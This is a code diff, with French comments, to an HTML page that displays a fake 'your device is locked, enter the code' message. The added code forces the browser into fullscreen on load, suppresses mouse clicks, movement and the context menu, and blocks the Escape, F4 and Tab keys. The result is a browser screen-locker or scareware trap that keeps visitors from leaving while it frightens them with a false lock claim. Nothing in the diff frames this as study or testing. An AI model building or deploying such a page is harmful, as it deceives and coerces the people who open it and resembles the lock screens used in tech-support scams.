@@ -18,7 +18,7 @@
             color: white;  
             font-family: 'Courier New', Courier, monospace;  
             text-align: center;  
-            overflow: hidden;  
+            overflow: hidden; /* Empêche le défilement */  
             display: flex;  
             justify-content: center;  
             align-items: center;  
@@ -84,10 +84,42 @@
         <div id="error-message">Code incorrect !</div>  
     </div>  
     <script>  
+        // Fonction pour activer le plein écran  
+        function openFullscreen() {  
+            let elem = document.documentElement;  
+            if (elem.requestFullscreen) {  
+                elem.requestFullscreen();  
+            } else if (elem.mozRequestFullScreen) {  
+                elem.mozRequestFullScreen();  
+            } else if (elem.webkitRequestFullscreen) {  
+                elem.webkitRequestFullscreen();  
+            } else if (elem.msRequestFullscreen) {  
+                elem.msRequestFullscreen();  
+            }  
+        }  
+
         // Affichage d'un message d'alerte après le chargement  
         window.onload = function() {  
+            openFullscreen(); // Force le mode plein écran  
             alert("Attention : Votre appareil est verrouillé ! Pour déverrouiller, veuillez entrer le code.");  
             document.getElementById('codeInput').focus(); // Focus automatique sur le champ  
+            disableMouse(); // Désactivate souris  
+        }  
+
+        // Désactivation des événements de souris  
+        function disableMouse() {  
+            document.addEventListener("mousemove", function(event) {  
+                event.preventDefault();  
+            });  
+            document.addEventListener("mousedown", function(event) {  
+                event.preventDefault();  
+            });  
+            document.addEventListener("mouseup", function(event) {  
+                event.preventDefault();  
+            });  
+            document.addEventListener("contextmenu", function(event) {  
+                event.preventDefault();  
+            });  
         }  
 
         // Vérification du code  
@@ -109,10 +141,11 @@
             }  
         });  
 
-        // Bloquer les interactions en dehors du champ d'entrée  
+        // Bloquer les interactions avec certaines touches  
         document.addEventListener("keydown", function(event) {  
-            if (event.key === "Tab" || event.key === "Escape") {  
-                event.preventDefault(); // Empêche Tab et Escape  
+            // Empêche les touches d'échap et F4  
+            if (event.key === "Escape" || event.key === "F4" || event.key === "Tab") {  
+                event.preventDefault();  
             }  
         });  
     </script>  
